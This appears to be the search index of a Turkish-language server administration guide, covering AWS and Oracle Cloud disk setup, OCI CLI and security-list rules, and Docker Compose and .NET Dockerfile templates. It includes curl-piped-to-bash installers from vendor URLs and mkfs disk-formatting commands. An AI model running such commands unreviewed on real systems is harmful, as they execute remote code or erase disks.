sayfas\u0131na gidin.</li> <li>Create Volume butonuna bas\u0131n.</li> <li>Availability Zone: Sunucunuzla (EC2) AYNI b\u00f6lgeyi se\u00e7in (\u00d6rn: <code>us-east-1a</code>).</li> <li>Olu\u015fturulan diske sa\u011f t\u0131klay\u0131p Attach Volume deyin ve sunucunuzu se\u00e7in.</li> </ol>"},{"location":"cloud/aws/storage/#3-sunucu-icinde-diski-tantma","title":"3. Sunucu \u0130\u00e7inde Diski Tan\u0131tma","text":"<p>AWS'de diskler genellikle <code>/dev/xvdf</code> veya modern (Nitro) sistemlerde <code>/dev/nvme1n1</code> olarak g\u00f6r\u00fcn\u00fcr.</p>"},{"location":"cloud/aws/storage/#adm-1-diski-bulun","title":"Ad\u0131m 1: Diski Bulun","text":"<pre><code>lsblk\n</code></pre> <p>(\u00d6rn: 50GB'l\u0131k yeni diskiniz nvme1n1 olarak g\u00f6r\u00fcn\u00fcyorsa devam edin).</p>"},{"location":"cloud/aws/storage/#adm-2-formatlama-sadece-ilk-kez","title":"Ad\u0131m 2: Formatlama (Sadece \u0130lk Kez)","text":"<pre><code># SADECE BO\u015e D\u0130SK \u0130\u00c7\u0130N!\nsudo mkfs.ext4 /dev/nvme1n1\n</code></pre>"},{"location":"cloud/aws/storage/#adm-3-kalc-baglant-fstab","title":"Ad\u0131m 3: Kal\u0131c\u0131 Ba\u011flant\u0131 (fstab)","text":"<p>Oracle rehberinde yapt\u0131\u011f\u0131m\u0131z gibi <code>UUID</code> kullanarak ba\u011flamak en g\u00fcvenli yoldur:</p> <ol> <li>UUID \u00d6\u011fren: <code>sudo blkid /dev/nvme1n1</code></li> <li>Klas\u00f6r A\u00e7: <code>sudo mkdir -p /data</code></li> <li>fstab'a Ekle: <code>sudo nano /etc/fstab</code></li> </ol> <pre><code>UUID=S\u0130Z\u0130N-UUID-BURAYA  /data  ext4  defaults,nofail  0  2\n</code></pre> <p>(AWS'de <code>nofail</code> eklemek \u00f6nemlidir; disk bir sebeple tak\u0131lmazsa sunucunun a\u00e7\u0131lmas\u0131n\u0131 engellemez).</p> <ol> <li>Ba\u011fla: <code>sudo mount -a</code></li> </ol>"},{"location":"cloud/aws/storage/#4-root-volume-genisletme-pratik","title":"4. Root Volume Geni\u015fletme (Pratik)","text":"<p>E\u011fer sunucuyu a\u00e7arken diski k\u00fc\u00e7\u00fck tuttuysan\u0131z ve sonradan AWS Console'dan boyutu art\u0131rd\u0131ysan\u0131z, sunucu i\u00e7inde \u015fu iki komutla kapasiteyi g\u00fcncelleyebilirsiniz:</p> <pre><code># Partisyonu geni\u015flet\nsudo growpart /dev/nvme0n1 1\n\n# Dosya sistemini geni\u015flet (ext4 i\u00e7in)\nsudo resize2fs /dev/nvme0n1p1\n</code></pre> <p>(Not: Cihaz isimleri nvme0n1p1 gibi sisteminize g\u00f6re de\u011fi\u015febilir, <code>lsblk</code> ile kontrol edin).</p>"},{"location":"cloud/oracle/cli/","title":"OCI CLI (Command Line Interface)","text":"<p>Oracle Cloud paneli bazen yava\u015f veya karma\u015f\u0131k olabilir. OCI CLI, terminalden sunucular\u0131n\u0131z\u0131 y\u00f6netmenizi, port a\u00e7man\u0131z\u0131 veya restart atman\u0131z\u0131 sa\u011flar. En \u00f6nemlisi, \"Infrastructure as Code\" mant\u0131\u011f\u0131na ilk ad\u0131md\u0131r.</p>"},{"location":"cloud/oracle/cli/#kurulum","title":"Kurulum","text":"<p>OCI CLI, Python tabanl\u0131d\u0131r. En kolay kurulum y\u00f6ntemi:</p> <pre><code># Otomatik kurulum scripti (Linux/Mac)\nbash -c \"$(curl -L https://raw.githubusercontent.com/oracle/oci-cli/master/scripts/install/install.sh)\"\n</code></pre> <p>Kurulum bittikten sonra versiyonu kontrol edin:</p> <pre><code>oci --version\n</code></pre>"},{"location":"cloud/oracle/cli/#konfigurasyon-auth","title":"Konfig\u00fcrasyon (Auth)","text":"<p>CLI'\u0131n hesab\u0131n\u0131za eri\u015fmesi i\u00e7in API Key olu\u015fturman\u0131z gerekir.</p> <ol> <li> <p>Config Ba\u015flat:</p> <pre><code>oci setup config\n</code></pre> <p>Bu komut size \u015funlar\u0131 soracak:</p> <ul> <li>User OCID (Oracle panelinde User Settings alt\u0131nda)</li> <li>Tenancy OCID (Oracle panelinde Tenancy Details alt\u0131nda)</li> <li>Region (\u00f6rn: <code>eu-frankfurt-1</code>)</li> <li>Yeni RSA Keypair olu\u015fturulsun mu? (Y deyin)</li> </ul> </li> <li> <p>API Key'i Y\u00fckle:     Komutun sonunda size bir <code>Public Key</code> i\u00e7eri\u011fi verecek (veya dosya yolunu s\u00f6yleyecek).</p> <ul> <li>Oracle Panel -&gt; User Settings -&gt; API Keys -&gt; \"Add API Key\" -&gt; \"Paste Public Key\" diyerek bu anahtar\u0131 yap\u0131\u015ft\u0131r\u0131n.</li> </ul> </li> <li> <p>Test: <pre><code>oci iam availability-domain list\n</code></pre>     Hata vermeden JSON \u00e7\u0131kt\u0131s\u0131 veriyorsa ba\u011flant\u0131 tamamd\u0131r.</p> </li> </ol>"},{"location":"cloud/oracle/cli/#pratik-komutlar","title":"Pratik Komutlar","text":""},{"location":"cloud/oracle/cli/#1-sunucu-listeleme-instance-list","title":"1. Sunucu Listeleme (Instance List)","text":"<pre><code># Compartment OCID'nizi bir de\u011fi\u015fkene atay\u0131n (kolayl\u0131k olsun)\nexport C=ocid1.compartment.oc1..aaaaaaa...\n\noci compute instance list --compartment-id $C --output table --query \"data[*].{Name:\\\"display-name\\\", State:\\\"lifecycle-state\\\", IP:\\\"public-ip\\\"}\"\n</code></pre>"},{"location":"cloud/oracle/cli/#2-sunucuyu-yeniden-baslatma-reboot","title":"2. Sunucuyu Yeniden Ba\u015flatma (Reboot)","text":"<p>Panel \u00e7al\u0131\u015fm\u0131yorsa hayat kurtar\u0131r.</p> <pre><code># \u0130lk komuttan Instance OCID'sini al\u0131n\noci compute instance action --action RESET --instance-id ocid1.instance.oc1...\n</code></pre>"},{"location":"cloud/oracle/cli/#3-security-liste-port-ekleme-hzl-firewall","title":"3. Security List'e Port Ekleme (H\u0131zl\u0131 Firewall)","text":"<p>Web panelde t\u0131klayarak port a\u00e7mak yerine:</p> <pre><code># Security List ID'sini bulman\u0131z gerekir\noci network security-list list --compartment-id $C\n\n# 8080 Portunu A\u00e7 (Ingress Rule)\noci network security-list update --security-list-id ocid1.securitylist... --ingress-security-rules '[{\"source\": \"0.0.0.0/0\", \"protocol\": \"6\", \"tcp-options\": {\"destination-port-range\": {\"min\": 8080, \"max\": 8080}}}]'\n</code></pre> <p>[!WARNING] &gt; <code>update</code> komutu mevcut kurallar\u0131 EZEB\u0130L\u0130R. Port eklerken <code>create</code> de\u011fil <code>update</code> i\u00e7inde liste vermek gerekti\u011fi i\u00e7in, production ortam\u0131nda JSON dosyas\u0131 ile \u00e7al\u0131\u015fmak daha g\u00fcvenlidir.</p>"},{"location":"cloud/oracle/cli/#json-ile-yonetim-onerilen","title":"JSON ile Y\u00f6netim (\u00d6nerilen)","text":"<p>Komut sat\u0131r\u0131nda uzun JSON yazmak yerine dosyadan okutun:</p> <p><code>rules.json</code>:</p> <pre><code>[\n  {\n    \"source\": \"0.0.0.0/0\",\n    \"protocol\": \"6\",\n    \"tcpOptions\": {\n      \"destinationPortRange\": {\n        \"max\": 443,\n        \"min\": 443\n      }\n    }\n  }\n]\n</code></pre> <p>Komut:</p> <pre><code>oci network security-list update ... --ingress-security-rules file://rules.json\n</code></pre>"},{"location":"cloud/oracle/network/","title":"Oracle Cloud Network (VCN)","text":"<p>Oracle Cloud'da bir \"Compute Instance\" (Sunucu) a\u00e7t\u0131\u011f\u0131n\u0131zda, Linux i\u015fletim sisteminden ba\u011f\u0131ms\u0131z olarak \u00e7al\u0131\u015fan bir D\u0131\u015f A\u011f Katman\u0131 vard\u0131r. Bu katman\u0131 do\u011fru yap\u0131land\u0131rmazsan\u0131z, sunucudaki firewall'u komple kapatsan\u0131z bile eri\u015fim sa\u011flayamazs\u0131n\u0131z.</p>"},{"location":"cloud/oracle/network/#1-vcn-virtual-cloud-network","title":"1. VCN (Virtual Cloud Network)","text":"<p>VCN, sunucular\u0131n\u0131z\u0131n i\u00e7inde ya\u015fad\u0131\u011f\u0131 sanal veri merkezidir.</p>"},{"location":"cloud/oracle/network/#hzl-kurulum-vcn-wizard","title":"H\u0131zl\u0131 Kurulum (VCN Wizard)","text":"<p>Oracle panelinde \"Networking -&gt; Virtual Cloud Networks\" men\u00fcs\u00fcne gidin. \"Start VCN Wizard\" butonunu kullan\u0131n ve \"Create VCN with Internet Connectivity\" se\u00e7ene\u011fini se\u00e7in. Bu sihirbaz sizin i\u00e7in \u015funlar\u0131 otomatik kurar:</p> <ul> <li>VCN: Ana a\u011f blo\u011fu (\u00f6rn: 10.0.0.0/16)</li> <li>Public Subnet: \u0130nternete a\u00e7\u0131k sunucular i\u00e7in.</li> <li>Private Subnet: D\u0131\u015far\u0131ya kapal\u0131 (veritaban\u0131 vb.) sunucular i\u00e7in.</li> <li>Internet Gateway: \u0130nternete \u00e7\u0131k\u0131\u015f kap\u0131s\u0131.</li> <li>Route Table: Trafik y\u00f6nlendirme kurallar\u0131.</li> </ul> <p>[!TIP] Yeni ba\u015fl\u0131yorsan\u0131z mutlaka Wizard kullan\u0131n. Manuel kurulumda Route Table veya Gateway unutulursa sunucu internete \u00e7\u0131kamaz.</p>"},{"location":"cloud/oracle/network/#2-security-lists-oraclen-firewallu","title":"2. Security Lists (Oracle'\u0131n Firewall'u)","text":"<p>En \u00e7ok kar\u0131\u015ft\u0131r\u0131lan nokta buras\u0131d\u0131r: Linux i\u00e7indeki UFW ile Oracle'\u0131n Security List'i farkl\u0131d\u0131r! Bir paketin sunucunuza ula\u015fmas\u0131 i\u00e7in \u0130K\u0130 duvardan da ge\u00e7mesi gerekir:</p> <ol> <li>OCI Security List (Bulut Duvar\u0131)</li> <li>Ubuntu UFW (\u0130\u015fletim Sistemi Duvar\u0131)</li> </ol>"},{"location":"cloud/oracle/network/#port-acma-ingress-rules-adm-adm","title":"Port A\u00e7ma (Ingress Rules) - Ad\u0131m Ad\u0131m","text":"<p>A\u00e7\u0131k portlar\u0131 g\u00f6rmek ve y\u00f6netmek i\u00e7in Security List'e gitmeniz gerekir. En kolay yol \u015fudur:</p> <ol> <li>Instance (Sunucu) sayfas\u0131ndas\u0131n\u0131z (Att\u0131\u011f\u0131n\u0131z ekran).</li> <li>Sayfada \"Primary VNIC\" veya \"Attached VNICs\" b\u00f6l\u00fcm\u00fcn\u00fc bulun.</li> <li>Orada \"Subnet: subnetpublic\" (veya benzeri) yazan bir link g\u00f6receksiniz. O linke t\u0131klay\u0131n.</li> <li>A\u00e7\u0131lan \"Subnet Details\" sayfas\u0131nda, sol men\u00fcden (veya Resources alt\u0131ndan) \"Security Lists\"e t\u0131klay\u0131n.</li> <li>Listelenen (genelde ismi <code>Default Security List...</code> oland\u0131r) g\u00fcvenlik listesine t\u0131klay\u0131n.</li> <li>Kar\u015f\u0131n\u0131za \"Ingress Rules\" (Gelen Kurallar\u0131) \u00e7\u0131kar. \u0130\u015fte portlar burada!</li> </ol> <p>\"Add Ingress Rules\" diyerek \u015fu portlar\u0131 a\u00e7\u0131n:</p> Source CIDR Protocol Port Range A\u00e7\u0131klama <code>0.0.0.0/0</code> TCP <code>22</code> (veya <code>2222</code>) SSH Eri\u015fimi <code>0.0.0.0/0</code> TCP <code>80</code> HTTP (Web) <code>0.0.0.0/0</code> TCP <code>443</code> HTTPS (SSL) <code>0.0.0.0/0</code> ICMP - Ping atmak isterseniz (Opsiyonel) <p>[!WARNING] E\u011fer SSH portunuzu de\u011fi\u015ftirdiyseniz (\u00f6rn: 2222 yapt\u0131ysan\u0131z), buradaki Security List'te de 2222'yi a\u00e7may\u0131 unutmay\u0131n! Yoksa sunucuya ba\u011flanamazs\u0131n\u0131z.</p>"},{"location":"cloud/oracle/network/#3-route-tables-internet-gateway","title":"3. Route Tables &amp; Internet Gateway","text":"<p>E\u011fer sunucunuz internete \u00e7\u0131kam\u0131yorsa (\u00f6rn: <code>apt update</code> hata veriyorsa), Route Table ayar\u0131 bozuktur.</p> <ol> <li>Internet Gateway'in \"Available\" durumda oldu\u011fundan emin olun.</li> <li>Route Table kurallar\u0131n\u0131 kontrol edin:<ul> <li>Destination: <code>0.0.0.0/0</code> (T\u00fcm d\u00fcnya)</li> <li>Target Type: Internet Gateway</li> <li>Target: (Sizin olu\u015fturdu\u011funuz gateway)</li> </ul> </li> </ol> <p>Bu kural, \"Sunucunun bilmedi\u011fi IP adreslerine (Google, GitHub vb.) gitmek i\u00e7in Internet Gateway'i kullan\" demektir.</p>"},{"location":"cloud/oracle/network/#4-statik-ip-reserved-public-ip","title":"4. Statik IP (Reserved Public IP)","text":"<p>Oracle'da sunucuyu yeniden ba\u015flat\u0131rsan\u0131z bazen Public IP de\u011fi\u015febilir. Bunu sabitlemek i\u00e7in:</p> <ol> <li>Instance detaylar\u0131na gidin.</li> <li>\"Attached VNICs\" men\u00fcs\u00fcne t\u0131klay\u0131n (Sol altta).</li> <li>VNIC ismine t\u0131klay\u0131n -&gt; \"IPv4 Addresses\".</li> <li>Mevcut IP'nin yan\u0131ndaki \u00fc\u00e7 noktaya t\u0131klay\u0131n -&gt; \"Edit\".</li> <li>\"No Public IP\" se\u00e7ip kaydedin (IP silinir).</li> <li>Tekrar \"Edit\" deyin -&gt; \"Reserved Public IP\" se\u00e7in ve \"Create New Reserved Public IP\" diyerek kal\u0131c\u0131 bir IP olu\u015fturun.</li> </ol>"},{"location":"cloud/oracle/network/#sorun-giderme","title":"Sorun Giderme","text":"<p>Soru: UFW'de portu a\u00e7t\u0131m (<code>ufw allow 80</code>) ama siteye giremiyorum? Cevap: %99 ihtimalle Oracle Security List'te 80 portunu a\u00e7mad\u0131n\u0131z. Oraya gidip Ingress Rule ekleyin.</p> <p>Soru: <code>apt update</code> \u00e7al\u0131\u015fm\u0131yor, ba\u011flant\u0131 yok? Cevap:</p> <ol> <li>DNS sorunu olabilir (<code>/etc/resolv.conf</code>).</li> <li>Route Table'da Internet Gateway (0.0.0.0/0) kural\u0131 eksik veya silinmi\u015f olabilir.</li> </ol> <p>Soru: SSH portumu 2222 yapt\u0131m, ba\u011flanam\u0131yorum? Cevap: Hem UFW'de (<code>ufw allow 2222</code>) hem de Oracle Security List'te (<code>TCP 2222</code>) kural eklediniz mi? \u0130kisinden biri eksikse \u00e7al\u0131\u015fmaz.</p>"},{"location":"cloud/oracle/overview/","title":"Oracle Cloud Genel Bak\u0131\u015f","text":"<p>Oracle Cloud Infrastructure (OCI), sundu\u011fu c\u00f6mert \"Free Tier\" (\u00dccretsiz Katman) ile ki\u015fisel sunucu bar\u0131nd\u0131rmak i\u00e7in m\u00fckemmel bir se\u00e7enektir.</p>"},{"location":"cloud/oracle/overview/#neden-oracle-cloud","title":"Neden Oracle Cloud?","text":"<ul> <li>ARM \u0130\u015flemciler (Ampere): 4 OCPU ve 24 GB RAM'e kadar tamamen \u00fccretsiz sunucu (VM.Standard.A1.Flex).</li> <li>Public IPv4: \u00dccretsiz statik IP sa\u011flar (Reserved IP).</li> <li>Disk: 200 GB'a kadar Block Volume saklama alan\u0131 \u00fccretsizdir.</li> </ul>"},{"location":"cloud/oracle/overview/#hesap-kurulum-ipuclar","title":"Hesap Kurulum \u0130pu\u00e7lar\u0131","text":"<ol> <li>B\u00f6lge (Region) Se\u00e7imi: Hesab\u0131 a\u00e7arken se\u00e7ti\u011finiz \"Home Region\" (\u00f6rn: Frankfurt, Amsterdam) kal\u0131c\u0131d\u0131r ve de\u011fi\u015ftirilemez. T\u00fcrkiye'ye yak\u0131n bir b\u00f6lge (Frankfurt) se\u00e7mek latency (gecikme) a\u00e7\u0131s\u0131ndan iyidir.</li> <li>Kart Do\u011frulama: Kay\u0131t s\u0131ras\u0131nda kredi kart\u0131ndan provizyon \u00e7ekilir ve iade edilir. Sanal kartlar bazen sorun \u00e7\u0131karabilir.</li> <li>SSH Key: Sunucu olu\u015ftururken mutlaka kendi olu\u015fturdu\u011funuz SSH Public Key'i (<code>id_ed25519.pub</code>) y\u00fckleyin. Oracle'\u0131n olu\u015fturdu\u011fu anahtarlar\u0131 indirmek yerine kendi anahtar\u0131n\u0131z\u0131 kullanmak daha g\u00fcvenlidir.</li> </ol>"},{"location":"cloud/oracle/overview/#servis-yaps","title":"Servis Yap\u0131s\u0131","text":"<p>Bu rehberde Oracle Cloud servislerini \u015fu ba\u015fl\u0131klar alt\u0131nda inceleyece\u011fiz:</p> <ul> <li>Network (VCN): A\u011f, Firewall ve IP ayarlar\u0131.</li> <li>CLI (Komut Sat\u0131r\u0131): Web panele girmeden y\u00f6netim.</li> </ul>"},{"location":"cloud/oracle/storage/","title":"Oracle Block Volume: Ekstra Depolama","text":"<p>Oracle Cloud'un \u00fccretsiz sundu\u011fu 200GB disk alan\u0131n\u0131 verimli kullanmak i\u00e7in Block Volume kullanmal\u0131s\u0131n\u0131z. \u0130\u015fletim sistemi \u00e7\u00f6kerse bile Block Volume'deki verileriniz (Docker volume'leri, veritabanlar\u0131) g\u00fcvende kal\u0131r.</p> <p>[!TIP] &gt; Neden Boot Volume De\u011fil? Boot volume (i\u015fletim sisteminin kurulu oldu\u011fu disk) \u00e7\u00f6kerse veya silinirse i\u00e7indeki veriler gider. Verilerinizi her zaman harici bir Block Volume'de tutmak \"Best Practice\"tir.</p>"},{"location":"cloud/oracle/storage/#1-volume-olusturma-panel","title":"1. Volume Olu\u015fturma (Panel)","text":"<ol> <li>Oracle Cloud panelinde Storage &gt; Block Volumes men\u00fcs\u00fcne gidin.</li> <li>Create Block Volume butonuna t\u0131klay\u0131n.</li> <li>Name: <code>data-volume</code> (veya istedi\u011finiz bir isim).</li> <li>Size: \u0130htiyac\u0131n\u0131z kadar (\u00d6rn: 50GB veya 100GB).</li> <li>Availability Domain: Sunucunuzla (Compute Instance) AYNI domain'i se\u00e7ti\u011finizden emin olun (\u00d6rn: <code>Frankfurt-1 AD-3</code>). Farkl\u0131 yerlerdeki diskleri sunucuya takamazs\u0131n\u0131z.</li> </ol>"},{"location":"cloud/oracle/storage/#2-volumeu-sunucuya-takma-attach","title":"2. Volume'\u00fc Sunucuya Takma (Attach)","text":"<ol> <li>Olu\u015fturdu\u011funuz Volume'\u00fcn i\u00e7ine girin.</li> <li>Soldan Attached Instances sekmesine t\u0131klay\u0131n.</li> <li>Attach to Instance butonuna bas\u0131n.<ul> <li>Instance: Sunucunuzu se\u00e7in.</li> <li>Attachment Type: <code>iSCSI</code> (Paravirtualized daha yava\u015ft\u0131r, iSCSI \u00f6nerilir).</li> <li>Device Path: Entegre yol yerine basit\u00e7e <code>/dev/oracleoci/oraclevdb</code> gibi bir yol se\u00e7imi sunmaz, bunu sunucu i\u00e7inde g\u00f6rece\u011fiz.</li> </ul> </li> <li>Attach diyerek i\u015flemi ba\u015flat\u0131n.</li> </ol>"},{"location":"cloud/oracle/storage/#iscsi-baglant-komutlar","title":"iSCSI Ba\u011flant\u0131 Komutlar\u0131","text":"<p>Attach i\u015flemi bitince (State: Attached), sa\u011fdaki \"\u00fc\u00e7 nokta\" men\u00fcs\u00fcnden iSCSI Commands &amp; Information se\u00e7ene\u011fine t\u0131klay\u0131n. Size 3-4 sat\u0131rl\u0131k uzun komutlar verecek.</p> <p>Bu komutlar\u0131 kopyalay\u0131n ve sunucunuzda (SSH ile) \u00e7al\u0131\u015ft\u0131r\u0131n.</p> <pre><code># \u00d6rnek (Sizin komutlar\u0131n\u0131z farkl\u0131 olacak!):\nsudo iscsiadm -m node -o new -T iqn.2015-12.com.oracleiaas:volume... -p 169.254.2.2:3260\nsudo iscsiadm -m node -o update -T iqn.2015-12.com.oracleiaas:volume... -n node.startup -v automatic\nsudo iscsiadm -m node -T iqn.2015-12.com.oracleiaas:volume... -p 169.254.2.2:3260 -l\n</code></pre> <p>Ba\u015far\u0131l\u0131 olup olmad\u0131\u011f\u0131n\u0131 kontrol edin:</p> <pre><code>lsblk\n# \u00c7\u0131kt\u0131da 'sdb' (veya sdc) ad\u0131nda yeni bir disk g\u00f6rmelisiniz.\n</code></pre>"},{"location":"cloud/oracle/storage/#3-formatlama-ve-mount-etme","title":"3. Formatlama ve Mount Etme","text":"<p>Disk ham (raw) haldedir. Dosya sistemi olu\u015fturmal\u0131y\u0131z.</p> <p>[!WARNING] Bu i\u015flem diskin i\u00e7indeki HER \u015eEY\u0130 S\u0130LER. Diski ilk kez kullan\u0131yorsan\u0131z yap\u0131n. Dolu bir diski takt\u0131ysan\u0131z bu ad\u0131m\u0131 atlay\u0131n!</p>"},{"location":"cloud/oracle/storage/#a-dosya-sistemi-olustur-format","title":"a. Dosya Sistemi Olu\u015ftur (Format)","text":"<pre><code># Diskin sdb oldu\u011funu varsay\u0131yoruz (lsblk ile kontrol edin!)\nsudo mkfs.ext4 -F /dev/sdb\n</code></pre>"},{"location":"cloud/oracle/storage/#b-kalc-mount-fstab","title":"b. Kal\u0131c\u0131 Mount (fstab)","text":"<p>Sunucu kapand\u0131\u011f\u0131nda ba\u011flant\u0131n\u0131n kopmamas\u0131 i\u00e7in <code>/etc/fstab</code> dosyas\u0131na eklemeliyiz.</p> <ol> <li> <p>Mount Klas\u00f6r\u00fc Olu\u015ftur:</p> <pre><code>sudo mkdir -p /mnt/blockvolume\n</code></pre> </li> <li> <p>UUID \u00d6\u011fren: <code>/dev/sdb</code> ismine g\u00fcvenmeyin, her rebootta de\u011fi\u015febilir. UUID sabittir.</p> <pre><code>sudo blkid -o value -s UUID /dev/sdb\n# \u00c7\u0131kt\u0131: a1b2c3d4-e5f6-.... (Bunu kopyalay\u0131n)\n</code></pre> </li> <li> <p>fstab D\u00fczenle:</p> <pre><code>sudo nano /etc/fstab\n</code></pre> <p>Dosyan\u0131n en alt\u0131na \u015fu sat\u0131r\u0131 ekleyin (UUID k\u0131sm\u0131n\u0131 kendi kodunuzla de\u011fi\u015ftirin):</p> <pre><code>UUID=S\u0130Z\u0130N-KOPYALADI\u011eINIZ-UUID  /mnt/blockvolume  ext4  defaults,noatime,_netdev  0  2\n</code></pre> <ul> <li><code>_netdev</code>: Bu bir a\u011f diskidir, a\u011f gelmeden mount etmeye \u00e7al\u0131\u015fma (Boot'un tak\u0131lmas\u0131n\u0131 \u00f6nler).</li> </ul> </li> <li> <p>Test Et ve Ba\u011fla:</p> <pre><code>sudo mount -a\n\n# Hata vermediyse kontrol et:\ndf -h | grep blockvolume\n</code></pre> </li> </ol>"},{"location":"cloud/oracle/storage/#4-kullanm-ipuclar","title":"4. Kullan\u0131m \u0130pu\u00e7lar\u0131","text":""},{"location":"cloud/oracle/storage/#yetkiler","title":"Yetkiler","text":"<p>Diski <code>root</code> mount etti\u011fi i\u00e7in normal kullan\u0131c\u0131 yazamaz. Sahipli\u011fi de\u011fi\u015ftirin:</p> <pre><code>sudo chown -R $USER:$USER /mnt/blockvolume\n</code></pre>"},{"location":"cloud/oracle/storage/#docker-verisini-buraya-tasmak","title":"Docker Verisini Buraya Ta\u015f\u0131mak","text":"<p>Docker'\u0131n t\u00fcm imajlar\u0131n\u0131 ve volume'lerini bu g\u00fcvenli diske ta\u015f\u0131mak i\u00e7in Docker Kurulumu rehberindeki \"Data Root\" b\u00f6l\u00fcm\u00fcn\u00fc okuyun.</p>"},{"location":"file-templates/docker-compose/","title":"Docker Compose Template","text":"<pre><code># Standard Docker Compose Template\n\nversion: \"3.8\"\n\nservices:\n  # 1. Frontend (React/Vue/Next)\n  app:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    container_name: my_app\n    restart: unless-stopped\n    ports:\n      - \"127.0.0.1:3000:3000\" # Localhost only (behind proxy)\n    environment:\n      - NODE_ENV=production\n    networks:\n      - internal_net\n\n  # 2. Proxy (Nginx)\n  nginx:\n    image: nginx:alpine\n    container_name: my_nginx\n    restart: always\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n    volumes:\n      - ./nginx.conf:/etc/nginx/nginx.conf:ro\n      - ./certs:/etc/nginx/certs:ro\n    depends_on:\n      - app\n    networks:\n      - internal_net\n\n  # 3. Database\n  db:\n    image: postgres:15-alpine\n    container_name: my_db\n    restart: always\n    environment:\n      POSTGRES_USER: ${DB_USER}\n      POSTGRES_PASSWORD: ${DB_PASS}\n      POSTGRES_DB: ${DB_NAME}\n    volumes:\n      - db_data:/var/lib/postgresql/data\n    networks:\n      - internal_net\n\nvolumes:\n  db_data:\n\nnetworks:\n  internal_net:\n    driver: bridge\n</code></pre>"},{"location":"file-templates/dotnet-backend/","title":".NET Backend (Production Ready) \ud83d\udd37","text":"<p>Bu \u015fablon, .NET projelerinizi (API veya MVC) prod\u00fcksiyon ortam\u0131na haz\u0131rlamak i\u00e7in optimize edilmi\u015f Dockerfile \u00f6rnekleri sunar.</p> <p>\u00d6zellikle Katmanl\u0131 Mimari (N-Layer / Clean Architecture) kullanan projelerde ba\u011f\u0131ml\u0131l\u0131klar\u0131n do\u011fru y\u00f6netilmesi ve Docker Cache mekanizmas\u0131n\u0131n bozulmamas\u0131 kritiktir.</p>"},{"location":"file-templates/dotnet-backend/#1-basit-monolith-proje","title":"\ud83c\udfd7\ufe0f 1. Basit / Monolith Proje","text":"<p>E\u011fer projeniz tek bir <code>.csproj</code> dosyas\u0131ndan olu\u015fuyorsa (klasik WebAPI), bu standart dosyay\u0131 kullan\u0131n.</p> <pre><code># --- Build Stage ---\nFROM mcr.microsoft.com/dotnet/sdk:8.0 AS build\nWORKDIR /src\n\n# \u00d6nce sadece proje dosyas\u0131n\u0131 kopyala ve restore et (Cache'i kullanmak i\u00e7in)\nCOPY [\"MyApp.csproj\", \"./\"]\nRUN dotnet restore \"MyApp.csproj\"\n\n# \u015eimdi kalan t\u00fcm kaynak kodlar\u0131n\u0131 kopyala\nCOPY . .\nRUN dotnet publish \"MyApp.csproj\" -c Release -o /app/publish /p:UseAppHost=false\n\n# --- Final Stage (Chiseled Ubuntu) ---\n# Shell i\u00e7ermeyen, hacklenmesi zor g\u00fcvenli imaj\nFROM mcr.microsoft.com/dotnet/aspnet:8.0-jammy-chiseled AS final\nWORKDIR /app\nCOPY --from=build /app/publish .\n\n# Port Ayar\u0131 (Chiseled imajlar 8080 kullan\u0131r)\nENV ASPNETCORE_HTTP_PORTS=8080\nEXPOSE 8080\n\nENTRYPOINT [\"dotnet\", \"MyApp.dll\"]\n</code></pre>"},{"location":"file-templates/dotnet-backend/#2-katmanl-mimari-clean-architecture","title":"\ud83c\udff0 2. Katmanl\u0131 Mimari (Clean Architecture)","text":"<p>Clean Architecture projelerinde <code>Core</code>, <code>Infrastructure</code>, <code>Application</code> gibi birden fazla k\u00fct\u00fcphane projesi olur. <code>COPY . .</code> yap\u0131p restore ederseniz, kodda tek bir harf de\u011fi\u015fse bile Docker t\u00fcm restore i\u015flemini (paket indirmeyi) ba\u015ftan yapar. Bu da build s\u00fcresini 3-4 dakikaya \u00e7\u0131kar\u0131r.</p> <p>A\u015fa\u011f\u0131daki y\u00f6ntem ile build s\u00fcresini saniyelere d\u00fc\u015f\u00fcrebilirsiniz.</p> <p>Senaryo:</p> <ul> <li><code>src/MyProject.Api</code> (Ba\u015flang\u0131\u00e7 Projesi)</li> <li><code>src/MyProject.Core</code></li> <li><code>src/MyProject.Infrastructure</code></li> </ul> <pre><code># --- Build Stage ---\nFROM mcr.microsoft.com/dotnet/sdk:8.0 AS build\nWORKDIR /src\n\n# ADIM 1: Sadece .csproj dosyalar\u0131n\u0131 (klas\u00f6r yap\u0131s\u0131n\u0131 koruyarak) kopyala\n# Bu sayede kod de\u011fi\u015fse bile bu katman cache'den gelir.\nCOPY [\"src/MyProject.Api/MyProject.Api.csproj\", \"src/MyProject.Api/\"]\nCOPY [\"src/MyProject.Core/MyProject.Core.csproj\", \"src/MyProject.Core/\"]\nCOPY [\"src/MyProject.Infrastructure/MyProject.Infrastructure.csproj\", \"src/MyProject.Infrastructure/\"]\n\n# ADIM 2: Restore i\u015flemini ba\u015flat (Sadece csproj'lar varken)\nRUN dotnet restore \"src/MyProject.Api/MyProject.Api.csproj\"\n\n# ADIM 3: Art\u0131k kodlar\u0131 kopyala\nCOPY . .\n\n# ADIM 4: Build ve Publish\nWORKDIR \"/src/src/MyProject.Api\"\nRUN dotnet publish \"MyProject.Api.csproj\" -c Release -o /app/publish /p:UseAppHost=false\n\n# --- Final Stage ---\nFROM mcr.microsoft.com/dotnet/aspnet:8.0-jammy-chiseled AS final\nWORKDIR /app\nCOPY --from=build /app/publish .\nENV ASPNETCORE_HTTP_PORTS=8080\nEXPOSE 8080\nENTRYPOINT [\"dotnet\", \"MyProject.Api.dll\"]\n</code></pre>"},{"location":"file-templates/dotnet-backend/#3-mvc-vs-api-fark","title":"\ud83d\uddbc\ufe0f 3. MVC vs API Fark\u0131","text":"<p>MVC projesi deploy ediyorsan\u0131z s\u00fcre\u00e7 API ile %95 ayn\u0131d\u0131r. Tek fark, e\u011fer Frontend Assets (CSS/JS) i\u00e7in Node.js kullan\u0131yorsan\u0131z (\u00f6rne\u011fin Webpack, TailwindCSS derlemesi gerekiyorsa) Dockerfile i\u00e7ine bir Node katman\u0131 eklenmelidir.</p> <p>MVC i\u00e7in Node.js Eklenmi\u015f Build Stage:</p> <pre><code>FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build\n\n# Node.js Kurulumu (Build a\u015famas\u0131nda gerekli)\nRUN apt-get update &amp;&amp; \\\n    apt-get install -y curl &amp;&amp; \\\n    curl -fsSL https://deb.nodesource.com/setup_20.x | bash - &amp;&amp; \\\n    apt-get install -y nodejs\n\nWORKDIR /src\n# ... (CSProj Restore Ad\u0131mlar\u0131 